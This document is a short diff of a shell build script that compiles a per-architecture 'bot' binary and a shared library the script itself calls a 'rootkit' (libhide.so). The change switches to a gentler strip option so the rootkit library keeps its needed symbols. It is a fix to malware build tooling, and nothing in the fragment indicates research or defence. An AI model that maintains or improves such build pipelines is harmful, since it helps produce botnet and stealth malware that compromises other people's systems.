@@ -38,7 +38,8 @@ build() {
     # Compile the rootkit shared library
     echo "    -> Compiling rootkit..."
     "$CC" $ROOTKIT_CFLAGS "$ROOTKIT_SRC" -o "$OUTPUT_DIR/$arch/libhide.so"
-    "$STRIP" "$OUTPUT_DIR/$arch/libhide.so"
+    # Use a less aggressive strip option for the shared library to keep necessary symbols
+    "$STRIP" -x "$OUTPUT_DIR/$arch/libhide.so"
 
     echo "    -> Success: $OUTPUT_DIR/$arch/bot and $OUTPUT_DIR/$arch/libhide.so"
 }
